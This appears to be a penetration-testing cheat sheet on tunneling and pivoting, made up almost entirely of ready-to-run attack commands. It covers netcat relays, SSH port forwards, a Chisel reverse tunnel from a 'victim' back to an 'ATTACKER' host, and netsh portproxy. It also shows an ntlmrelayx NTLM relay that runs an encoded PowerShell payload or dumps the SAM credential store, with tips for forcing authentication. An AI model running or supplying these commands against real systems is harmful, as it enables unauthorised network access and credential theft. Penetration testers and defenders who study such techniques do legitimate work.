# Tunneling & Relaying

## TCP Relay with Netcat
```bash
# Relay traffic from port 4444 to port 22
nc -lvvp 4444 | nc localhost 22
# Send data through relay
echo test | nc localhost 4444
```

## SSH Tunneling
```bash
# Local port forward: access REMOTE_TARGET:80 via localhost:8080
ssh -L 8080:REMOTE_TARGET:80 user@jumpbox
# Dynamic SOCKS proxy
ssh -D 1080 user@jumpbox
# Remote port forward: expose internal:80 on jumpbox:8080
ssh -R 8080:localhost:80 user@jumpbox
```

## NTLM Relay
```bash
# Setup relay to target, execute command on auth
ntlmrelayx.py -t TARGET -c "powershell -e <base64>"
# Or dump SAM
ntlmrelayx.py -t TARGET -smb2support
```
- Requires SMB signing disabled on target
- Trigger via forced auth (SCF, HTML img, etc.)

## Chisel (HTTP Tunnel)
```bash
# Server (attacker)
chisel server --reverse --port 8080
# Client (victim)
chisel client ATTACKER:8080 R:socks
```

## Port Forwarding with netsh (Windows)
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_TARGET
```

## Notes
- Always check firewall rules before tunneling
- SOCKS proxies enable tool pivoting (proxychains)
